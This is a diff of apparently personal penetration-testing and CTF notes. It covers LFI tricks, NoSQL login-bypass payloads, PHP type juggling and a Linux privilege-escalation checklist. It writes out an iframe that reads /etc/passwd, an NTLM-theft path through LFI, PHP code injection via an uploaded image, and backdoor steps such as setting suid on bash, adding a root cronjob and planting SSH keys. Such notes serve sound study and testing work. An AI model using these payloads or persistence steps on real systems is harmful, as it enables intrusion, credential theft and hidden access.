@@ -127,6 +127,8 @@ arp scan network
 
 ## DIRECTORY BRUTEFORCING
 
+find .git directory, backup file, directory listing and other intresting files!
+
 ### gobuster 
 
 **USEFUL WORDLISTS:**
@@ -303,6 +305,8 @@ lfi in post requests can exist
 
 always use burp to check for lfi
 
+IFRAME PDF EMBED FILES `<iframe src=file:///etc/passwd width=100%></iframe>`
+
 https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
 **NTLM STEAL WITH LFI** test.php?include=\\$RESPONDER_IP\ (it should work even with "/" to bypass some waf)
@@ -336,6 +340,8 @@ we can modify source code of a page if there is a php post parameter that is vul
 a username can be taken from /etc/passwd and reused for login page
 
 **if we have INCLUDE LFI in a page and we can at the same time upload a file to the server, it's simple because we can inject php code like <?php system("id")?> to the image and then include it with the lfi to load it and get the shell**
+
+we can try to get capabilities of process by getting /proc/PID/stat or /proc/self/stat and then decoding capabilities with `capsh --decode='(string)'`
 
 get to check for other subdomains `/etc/apache2/sites-available/000-default.conf` OR `/etc/nginx/sites-enabled/default`
 
@@ -517,9 +523,7 @@ load file
 
 `'/**/union/**/select/**1,2--/**/-`
 
-### boolean sqli
-
-### blind sqli
+for blind and boolean sql injection try to use sqlmap or write a custom script
 
 
 ## SSRF 
@@ -545,12 +549,241 @@ HTTPServer(("0.0.0.0", 8081), Redirect).serve_forever()
 
 ipv6 url might bypass url block
 
-hex encoded IP ADDRESS
+hex encoded IP ADDRESS might do too
 
 
 ## nosql injection
 
-exiftool pdf files to get generator
-IFRAME PDF EMBED FILES <iframe src=file:///etc/passwd width=100%></iframe>
+**source**:
+https://book.hacktricks.xyz/pentesting-web/nosql-injection
 
-## type confusion
+to bypass login we can check for a nosql injection here is how:
+
+
+`username[$ne]=toto&password[$ne]=toto`
+
+or, more efficiently, we can try by **changing the request type to application/json** to **then** insert this payload
+
+`{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }`
+
+```json
+{
+   "username":{
+      "$ne":"foo"
+   },
+   "password":{
+      "$ne":"bar"
+   }
+}
+```
+
+to extract lenght info:
+
+`username[$ne]=toto&password[$regex]=.{1}`
+
+we can even dump database with the help of some scripts online!
+
+
+## type confusion/type juggling
+
+this is a php magic trick that some times works! (try it on bug bounty too if you want)
+
+```json
+{
+  "type": true
+}
+```
+
+`username[]=foo&password[]=bar`
+
+# privesc
+
+https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+
+## useful commands
+
+## get environment variables
+
+`env`
+
+## get allowed sudo commands and environment variables
+
+When conducting a security assessment, it's important to pay close attention to any interesting entries that may appear in the output of the sudo -l command. These entries may indicate the presence of a privileged binary that can be used to elevate one's access level. To determine if a binary can be used for privilege escalation, it's recommended to check the GTFObins website (https://gtfobins.github.io/). This website contains a wealth of information on various Linux binaries and their potential for privilege escalation. Additionally, it's also a good practice to check for SUID (Set User ID) binaries on the system, as these may also be used for privilege escalation. Remember that privilege escalation is one of the key steps in the penetration testing process and must be thoroughly investigated.
+
+`sudo -l`
+
+## list all files
+
+`ls -la`
+
+## get id
+
+`id`
+
+## get groups
+
+`groups`
+
+## get a list of all users and possibly services
+
+`cat /etc/passwd`
+
+(cut for bruteforce)
+
+`cat /etc/passwd | cut -d ":" -f 1`
+
+## get linux version and architecture
+
+`cat /proc/version`
+
+`uname -a`
+
+`cat /etc/issue`
+
+## get list of running processes by everyone
+
+`ps eaf`
+
+`ps eaf --forest`
+
+`ps aux`
+
+## get interfaces 
+
+(look for interfaces to pivot)
+
+`ip a`
+
+`ifconfig`
+
+## get open ports
+
+netstat -a: shows all listening ports and established connections.
+
+netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
+
+netstat -l: list ports in “listening” mode. 
+
+ This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
+
+netstat -s: list network usage statistics by protocol
+
+**these commands will mostly get all the info you need**
+
+`netstat -alnp`
+
+`ss -tulnp`
+
+## find
+
+2>/dev/null is needed to redirect errors to null so they don't spam your shell 
+
+```bash
+find . -name flag1.txt 2>/dev/null (find file)
+find / -type d -name config 2>/dev/null (type directory)
+find / -type f -perm 0777 2>/dev/null (read, write, & execute for owner, group and others)
+find / -perm a=x 2>/dev/null (executable files)
+find / -mtime 10 2>/dev/null (modified 10 days)
+find / -size 50M 2>/dev/null (50 megabyte size)
+find / -name perl* 2>/dev/null (find files that begin with perl)
+find / -name python* 2>/dev/null (find files that begin with python)
+find / -name gcc* 2>/dev/null (find files that begin with gcc)
+find / -writable 2>/dev/null (find files that are writable by you)
+find / -readable 2>/dev/null (find files that are readable by you)
+
+SUID:
+
+find / -perm -u=s -type f 2>/dev/null
+
+FLAG
+
+find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
+find / -type f -name "*flag*" -ls 2>/dev/null
+
+CHECK FILES OWNED BY USER:
+find / -type f -user server-management -exec ls -l {} + 2>/dev/null
+
+```
+
+## useful enumeration scripts
+
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS (all in one privesc tool)
+
+https://github.com/DominicBreuker/pspy (find cronjobs and spy for commands ran by other users)
+
+## useful binaries
+
+nc (we can also upload old version with the execute command to get revshells)
+
+## other tips
+
+when you find a password always use them for lateral movement `su` command, databases...
+
+identify kernel version and check for kernel exploits
+
+**check soruce code of applications, they may contain credentials or other juicy things!**
+
+keep in mind that if you have root read access we can get /etc/shadow and crack the hashes
+
+if all environment variables are allowed before a specific command found in `sudo -l` we could use **LD_PRELOAD** to privesc
+
+**CAPABILITIES** `capsh -r / 2>/dev/nul`
+
+***CRON JOBS** (use pspy or cat /etc/crontab)
+
+if some wordpress website is running we can get /var/www/wordpress/wp-config.php to extract intresting info
+
+remember to check config files
+
+**if i can't access from the external maybe i can from internal (ssh tunnel or chisel forwarding)**
+
+bash -c "(command)" sometimes solves all the problems!
+
+in the /opt directory we can find intresting optional files
+
+we can fuzz for txt files?
+
+**symlink privesc**
+
+bruteforce?
+
+**port forwarding / pivoting**
+
+check if sudo is using the secure path environment variable
+
+enumerate groups
+
+**exiftool** to get exif data from pdf,images etc (maybe get comments or author)
+
+check for .bak files
+
+we can transfer docker binary if there isn't one
+
+**transfer STATICALLY linked binaries**
+
+if we find a command injections or similar we can suid /bin/bash to privescalate (and we can insert a cronjob to backdoor root)
+
+**when you have the occasion always use ssh for a stable shell (also Check id_rsa)**
+
+we can echo our public key to the user's authorized_keys files in /home/user/.ssh/authorized_keys or /root/.ssh/authorized_keys
+
+**check pspy64!**
+
+`cat /proc/net/arp` to check the arp cache for ips
+
+best ways to find strings on a elf file?:
+`cat` it or use `strings` command
+
+check **/var/www/html**
+
+**`watch -x ls -la`** to continuously execute a command (in this case `ls -la`)
+
+we can intercept auth if a program tries to do it (tcpdump/wireshark) or open listener on port
+
+**check for reflections between docker container and host machine, this could be used for breakout**
+
+`lsattr` to get attributes of a file
+
+**look for doas program** and for /usr/local/etc/doas.conf (basically a `sudo -l`)
+
+backup files in unix have a .bak extension or a tilde(~) at the end of the file 
